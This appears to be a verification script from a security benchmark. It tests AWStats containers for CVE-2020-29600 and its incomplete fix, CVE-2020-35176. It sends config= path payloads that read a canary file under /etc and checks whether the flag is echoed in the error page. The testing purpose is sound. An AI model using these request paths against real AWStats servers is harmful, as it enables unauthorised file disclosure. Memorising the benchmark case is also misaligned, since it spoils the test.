#!/usr/bin/env bash
# =====================================================================
# PCBV2-0046 awstats-cve-2020-35176 (CVE-2020-29600 -> CVE-2020-35176)
#   seed     (CVE-2020-29600): GET /cgi-bin/awstats.pl?config=/etc/pcb_canary/flag.conf
#            —— 绝对路径 config= 经 Read_Config 的 File::Spec->rel2abs fallback 直接
#            打开 /etc 下 canary（一行 AWStats 配置 `Include "<FLAG>"`，解析失败时
#            错误页回显 FLAG）。V0(7.7 rel2abs fallback 存在) 可达；
#            V1(7.8 fallback 注释掉) 绝对路径不再打开 -> 阻断。
#   residual (CVE-2020-35176): GET /cgi-bin/awstats.pl?config=pcb_canary/flag.conf
#            —— 省略前导 /etc 的部分绝对路径（无前导 /、无 ..）；V1(7.8) 的
#            @PossibleConfigDir 仍含 "/etc"，搜索循环拼 $searchdir$SiteConfig ->
#            /etc/pcb_canary/flag.conf 被打开 == 不完整修复 -> V1 可达（FLAG 回显）；
#            V2(7.9 移除 /etc) 阻断。
#   效果通道 = HTTP 响应 body（"Could not open include file: /etc/pcb_canary/<FLAG>"
#            错误页明文回显 FLAG）。
#   判定基准 = RUN_FLAG（提交值）：正常 seed 时 RUN_FLAG=平台真 flag；wrong/stale
#             检查时 RUN_FLAG=提交的 override（通道含真 flag≠override -> 10）。
#   退出码：0=效果发生(flag 出现在响应 body) 10=未发生 20=环境失败 30=参数错误
# =====================================================================
set -uo pipefail
: "${RUN_ID:?}" "${COMPOSE_PROJECT_NAME:?}" "${RUN_FLAG:?}" "${VERSION:?}" "${WORK_DIR:?}"
MODE="${1:-}"
[[ "$MODE" == "--seed" || "$MODE" == "--residual" ]] || { echo "usage: --seed|--residual" >&2; exit 30; }
CASE_DIR="$(cd "$(dirname "$0")/.." && pwd)"
PY="${PCB_PYTHON:-python3}"
JUDGE_FLAG="$RUN_FLAG"
mkdir -p "$WORK_DIR" 2>/dev/null || true

# 宿主端口：优先 docker compose port 动态解析，回退固定映射（38870/38871/38872 -> 容器 80）
PORT="$(CPORT="$(grep -A4 '^service:' "$CASE_DIR/case.yaml" | grep -oE 'exposed_ports: \[[0-9, ]*\]' | grep -oE '[0-9]+' | head -1)"
CPORT="${CPORT:-80}"
docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" port "$VERSION" "$CPORT" 2>/dev/null | sed 's/.*://' | tr -d '[:space:]')"
if [[ -z "$PORT" ]]; then
  case "$VERSION" in
    v0) PORT=38870;; v1) PORT=38871;; v2) PORT=38872;; *) PORT=38871;;
  esac
# 动态端口优先（compose 已转 PORT_ 动态端口）；失败回退硬编码
_SVC_ALL="$(docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" --profile "$VERSION" config --services 2>/dev/null | grep -E "(^|-|_)$VERSION$")"
SVC="$(printf '%s\n' "$_SVC_ALL" | grep -vE "db|redis|mongo|mysql|postgres|sidecar|callback" | head -1)"
SVC="${SVC:-$(printf '%s\n' "$_SVC_ALL" | head -1)}"
_CP="$(grep -A4 '^service:' "$CASE_DIR/case.yaml" | grep -oE 'exposed_ports: \[[0-9, ]*\]' | grep -oE '[0-9]+' | head -1)"
_DYN="$(docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" port "$SVC" "${_CP:-8080}" 2>/dev/null | sed 's/.*://' | tr -d '[:space:]')"
[[ -n "$_DYN" ]] && PORT="$_DYN"
export PCB_TARGET_PORT="${PORT:-}"
fi
[[ -n "$PORT" ]] || { echo "ERR: cannot resolve port for $VERSION" >&2; exit 20; }

# 就绪等待：apache 首页 200
"$PY" - "$PORT" <<'PYEOF'
import sys, time, urllib.request
port = sys.argv[1]
for _ in range(60):
    try:
        with urllib.request.urlopen(f"http://127.0.0.1:{port}/", timeout=5) as r:
            if r.status == 200:
                sys.exit(0)
    except Exception:
        pass
    time.sleep(2)
sys.exit(1)
PYEOF
[[ $? -eq 0 ]] || { echo "ERR: awstats $VERSION not ready" >&2; exit 20; }

# 执行 + 判定：curl --path-as-is GET（与 poc/seed_exec.py 一致）。
# 有 HTTP 状态码但 body 无 RUN_FLAG -> 10；无状态码（连接失败）-> 20。
"$PY" - "$PORT" "$JUDGE_FLAG" "$MODE" <<'PYEOF'
import subprocess, sys

port, flag, mode = sys.argv[1], sys.argv[2], sys.argv[3]
if mode == "--seed":
    path = "/cgi-bin/awstats.pl?config=/etc/pcb_canary/flag.conf"
else:
    path = "/cgi-bin/awstats.pl?config=pcb_canary/flag.conf"
url = f"http://127.0.0.1:{port}{path}"
proc = subprocess.run(["curl", "--path-as-is", "-sS", "-m", "20",
                       "-w", "\n%{http_code}", url],
                      text=True, capture_output=True, check=False)
out = proc.stdout
status, body = "", out
if "\n" in out:
    body, status = out.rsplit("\n", 1)
print(f"[verify {mode}] {path}")
print(f"[verify] HTTP {status} body_head={body[:160]!r}")
if not status:
    print("[verify] no HTTP status (connection failed)", file=sys.stderr)
    sys.exit(20)
sys.exit(0 if flag in body else 10)
PYEOF
RC=$?
echo "verify[$MODE] version=$VERSION rc=$RC (judge_flag=$JUDGE_FLAG)" >&2
exit "$RC"
